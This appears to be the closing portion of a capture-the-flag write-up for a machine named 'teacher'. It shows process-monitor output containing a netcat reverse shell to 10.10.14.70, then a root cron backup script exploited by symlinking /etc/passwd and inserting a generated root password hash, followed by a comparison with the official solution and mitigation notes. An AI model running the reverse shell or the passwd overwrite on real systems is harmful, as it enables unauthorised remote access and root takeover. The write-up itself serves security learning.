2021/02/07 18:35:06 CMD: UID=33   PID=7384   | bash 
2021/02/07 18:35:06 CMD: UID=33   PID=7383   | sh -c bash 
2021/02/07 18:35:06 CMD: UID=33   PID=7382   | script /dev/null -c bash 
2021/02/07 18:35:06 CMD: UID=33   PID=7316   | bash 
2021/02/07 18:35:06 CMD: UID=33   PID=7315   | sh -c nc 10.10.14.70 1337 -e /bin/bash 
2021/02/07 18:35:06 CMD: UID=33   PID=7248   | /usr/sbin/apache2 -k start 
2021/02/07 18:35:06 CMD: UID=33   PID=7211   | /usr/sbin/apache2 -k start 
2021/02/07 18:35:06 CMD: UID=33   PID=7070   | /usr/sbin/apache2 -k start 
2021/02/07 18:35:06 CMD: UID=0    PID=7      | 
2021/02/07 18:35:06 CMD: UID=33   PID=6980   | /usr/sbin/apache2 -k start 
2021/02/07 18:35:06 CMD: UID=33   PID=6978   | /usr/sbin/apache2 -k start 
2021/02/07 18:35:06 CMD: UID=0    PID=696    | /sbin/agetty --noclear tty1 linux 
2021/02/07 18:35:06 CMD: UID=33   PID=6925   | /usr/sbin/apache2 -k start 
2021/02/07 18:35:06 CMD: UID=33   PID=6900   | /usr/sbin/apache2 -k start 
2021/02/07 18:35:06 CMD: UID=33   PID=6884   | /usr/sbin/apache2 -k start 
2021/02/07 18:35:06 CMD: UID=33   PID=6878   | /usr/sbin/apache2 -k start 
2021/02/07 18:35:06 CMD: UID=33   PID=6831   | /usr/sbin/apache2 -k start 
2021/02/07 18:35:06 CMD: UID=0    PID=5      | 
2021/02/07 18:35:06 CMD: UID=0    PID=432    | /usr/bin/VGAuthService 
2021/02/07 18:35:06 CMD: UID=0    PID=430    | /usr/sbin/rsyslogd -n 
2021/02/07 18:35:06 CMD: UID=105  PID=422    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation 
2021/02/07 18:35:06 CMD: UID=0    PID=421    | /usr/sbin/cron -f 
2021/02/07 18:35:06 CMD: UID=0    PID=420    | /lib/systemd/systemd-logind 
2021/02/07 18:35:06 CMD: UID=0    PID=42     | 
2021/02/07 18:35:06 CMD: UID=100  PID=410    | /lib/systemd/systemd-timesyncd 
2021/02/07 18:35:06 CMD: UID=0    PID=41     | 
2021/02/07 18:35:06 CMD: UID=0    PID=309    | 
2021/02/07 18:35:06 CMD: UID=0    PID=3      | 
2021/02/07 18:35:06 CMD: UID=0    PID=29     | 
2021/02/07 18:35:06 CMD: UID=0    PID=28     | 
2021/02/07 18:35:06 CMD: UID=0    PID=27     | 
2021/02/07 18:35:06 CMD: UID=0    PID=26     | 
2021/02/07 18:35:06 CMD: UID=0    PID=25     | 
2021/02/07 18:35:06 CMD: UID=0    PID=24     | 
2021/02/07 18:35:06 CMD: UID=0    PID=23     | 
2021/02/07 18:35:06 CMD: UID=0    PID=22     | 
2021/02/07 18:35:06 CMD: UID=0    PID=216    | /lib/systemd/systemd-udevd 
2021/02/07 18:35:06 CMD: UID=0    PID=21     | 
2021/02/07 18:35:06 CMD: UID=0    PID=2      | 
2021/02/07 18:35:06 CMD: UID=0    PID=195    | /lib/systemd/systemd-journald 
2021/02/07 18:35:06 CMD: UID=0    PID=19     | 
2021/02/07 18:35:06 CMD: UID=0    PID=189    | 
2021/02/07 18:35:06 CMD: UID=0    PID=188    | /usr/bin/vmtoolsd 
2021/02/07 18:35:06 CMD: UID=0    PID=18     | 
2021/02/07 18:35:06 CMD: UID=0    PID=17     | 
2021/02/07 18:35:06 CMD: UID=0    PID=165    | 
2021/02/07 18:35:06 CMD: UID=0    PID=164    | 
2021/02/07 18:35:06 CMD: UID=0    PID=16     | 
2021/02/07 18:35:06 CMD: UID=0    PID=15     | 
2021/02/07 18:35:06 CMD: UID=0    PID=14     | 
2021/02/07 18:35:06 CMD: UID=0    PID=130    | 
2021/02/07 18:35:06 CMD: UID=0    PID=13     | 
2021/02/07 18:35:06 CMD: UID=0    PID=128    | 
2021/02/07 18:35:06 CMD: UID=0    PID=12     | 
2021/02/07 18:35:06 CMD: UID=0    PID=114    | 
2021/02/07 18:35:06 CMD: UID=0    PID=112    | 
2021/02/07 18:35:06 CMD: UID=0    PID=110    | 
2021/02/07 18:35:06 CMD: UID=0    PID=11     | 
2021/02/07 18:35:06 CMD: UID=0    PID=108    | 
2021/02/07 18:35:06 CMD: UID=0    PID=107    | 
2021/02/07 18:35:06 CMD: UID=0    PID=105    | 
2021/02/07 18:35:06 CMD: UID=0    PID=104    | 
2021/02/07 18:35:06 CMD: UID=0    PID=10     | 
2021/02/07 18:35:06 CMD: UID=0    PID=1      | /sbin/init 
2021/02/07 18:36:01 CMD: UID=0    PID=9031   | /usr/sbin/CRON -f 
2021/02/07 18:36:01 CMD: UID=0    PID=9032   | /usr/sbin/CRON -f 
2021/02/07 18:36:01 CMD: UID=0    PID=9033   | /bin/sh -c /usr/bin/backup.sh 
2021/02/07 18:36:01 CMD: UID=0    PID=9034   | /bin/bash /usr/bin/backup.sh 
2021/02/07 18:36:01 CMD: UID=0    PID=9035   | tar -czvf tmp/backup_courses.tar.gz courses/algebra 
2021/02/07 18:36:01 CMD: UID=0    PID=9036   | /bin/sh -c gzip 
2021/02/07 18:36:01 CMD: UID=0    PID=9037   | 
2021/02/07 18:36:01 CMD: UID=0    PID=9038   | tar -xf backup_courses.tar.gz 
2021/02/07 18:36:01 CMD: UID=0    PID=9039   | /bin/bash /usr/bin/backup.sh 
^CExiting program... (interrupt)
giovanni@teacher:~$ 
```

The "/bin/bash /usr/bin/backup.sh" lines seem weird. 

```
giovanni@teacher:~$ ls -la /usr/bin/backup.sh 
-rwxr-xr-x 1 root root 138 Jun 27  2018 /usr/bin/backup.sh
giovanni@teacher:~$ file /usr/bin/backup.sh 
/usr/bin/backup.sh: Bourne-Again shell script, ASCII text executable
giovanni@teacher:~$ cat /usr/bin/backup.sh 
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
giovanni@teacher:~$ 
```

We see that it chmod 777's everything in that folder. 


I looked around for some sort of privesc possibility and eventually found: https://www.exploit-db.com/papers/13199 


```
giovanni@teacher:~/work/tmp$ ln -s /etc/passwd .
giovanni@teacher:~/work/tmp$ ls -la
total 16
drwxr-xr-x 3 giovanni giovanni 4096 Feb  7 18:58 .
drwxr-xr-x 4 giovanni giovanni 4096 Jun 27  2018 ..
-rwxrwxrwx 1 root     root      256 Feb  7 18:58 backup_courses.tar.gz
drwxrwxrwx 3 root     root     4096 Jun 27  2018 courses
lrwxrwxrwx 1 giovanni giovanni   11 Feb  7 18:58 passwd -> /etc/passwd
giovanni@teacher:~/work/tmp$ 
```


So we are essentially creating our own version of /etc/passwd here.

And we can see that the permissions of /etc/passwd are editable now as well:

```
giovanni@teacher:~/work/tmp$ ls -la /etc/passwd
-rwxrwxrwx 1 root root 1450 Jun 27  2018 /etc/passwd
giovanni@teacher:~/work/tmp$ 
```

So now we can insert our own password as the root password:

```
giovanni@teacher:~/work/tmp$ which mkpasswd 
/usr/bin/mkpasswd
giovanni@teacher:~/work/tmp$ mkpasswd --method=SHA-512
Password: 
$6$eZSlmmzk.tQp$aCcp94Q0.ccKTN4sUNaue1ANf4U.w8HB2VYw08s9pm2pbm7O9poaU5EIhBKpjtp36wHXkT7t0MVxzDyU6q4zr1
giovanni@teacher:~/work/tmp$ 
```

If mkpasswd does not exist, we can use openssl, or even python.

So now we can just insert this password where the x is in /etc/passwd:

```
root:$6$eZSlmmzk.tQp$aCcp94Q0.ccKTN4sUNaue1ANf4U.w8HB2VYw08s9pm2pbm7O9poaU5EIhBKpjtp36wHXkT7t0MVxzDyU6q4zr1:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
mysql:x:107:112:MySQL Server,,,:/nonexistent:/bin/false
giovanni:x:1000:1000:Giovanni,1337,,:/home/giovanni:/bin/bash
```

And get root:

```
giovanni@teacher:~/work/tmp$ su root
Password: 
root@teacher:/home/giovanni/work/tmp# whoami
root
root@teacher:/home/giovanni/work/tmp# 
```


## Comparing myself to the official writeup:

They notice that one of the teachers images is not rendered. and find 5.png that way. They get the password, and assume that Giovanni is the password.

They use the same moodle exploit. They URL encode the payload, which I did not have to do. Maybe because I just did so in the browser?

They find the config.php file inside the moodle directory, and retrieve the credentials for giovanni on the machine.

After finding the backup.sh script, they leverage the chmod to rename the courses directory, and create a symlink to the root directory.

I actually did try to create a root symlink directory, but I never though about renaming the root symlink to courses. Which would give me access to the root.txt file.

I am happy that I managed to get root out of it though, and not just the text file.


## How to stop this exploit:

I don't know how Giovanni's password request ended up as 5.png, but internal messages should never be publically available. And sending parts of a password in plaintext is a very bad idea.

The password of the user account should also not be stored in a "backup" user in a database available to a www-data account.

The backup.sh script is also an unnescessary script to have running. It's just a very quick-fix that resulted in a privesc possibility.